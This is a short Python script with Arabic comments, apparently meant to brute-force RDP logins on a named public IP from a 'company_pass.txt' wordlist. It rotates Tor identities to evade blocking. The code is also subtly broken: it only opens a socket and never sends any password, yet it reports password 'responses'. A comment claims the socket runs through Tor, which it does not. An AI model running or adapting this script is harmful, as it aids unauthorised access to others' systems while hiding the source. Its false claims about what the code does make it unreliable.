nano auto_rotate_ip.py


import socket
import time
import os
import requests

target_ip = "105.154.71.37"
port = 3389

proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

def get_current_ip():
    try:
        # استخدام رابط نصي مباشر ومستقر بدون إعادات توجيه 302
        res = requests.get('https://api.ipify.org', proxies=proxies, timeout=8)
        return res.text.strip()
    except:
        return "جاري بناء المسار الآمن..."

def change_tor_ip():
    print("[🔄] تم رصد حظر أو عدم استجابة! جاري توليد هوية IP جديدة...")
    os.system("pkill -HUP tor")
    time.sleep(5) # وقت كافٍ لاستقرار اتصال Tor الجديد

try:
    with open("company_pass.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]
except FileNotFoundError:
    print("[-] خطأ: ملف company_pass.txt غير موجود.")
    exit()

print(f"[+] بدء الفحص الذكي. الـ IP الحالي للشبكة: {get_current_ip()}")

for password in passwords:
    current_identity = get_current_ip()
    print(f"[#] تجربة الكلمة: {password} | عبر الـ IP الحالي: {current_identity}")

    try:
        # فحص استجابة المنفذ تحت حماية شبكة تور لتفادي حظر جهازك
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)

        result = s.connect_ex((target_ip, port))

        if result == 0:
            print(f"[+] المنفذ مستجيب للكلمة {password}. يتم الانتقال للتأكيد.")
            # تأخير بسيط لحماية القناة من الإغلاق السريع من جدار حماية الويندوز
            time.sleep(2)
        else:
            change_tor_ip()
            continue

        s.close()

    except Exception as e:
        change_tor_ip()

print("[+] انتهى فحص قائمة الكلمات بالكامل.")


python auto_rotate_ip.py
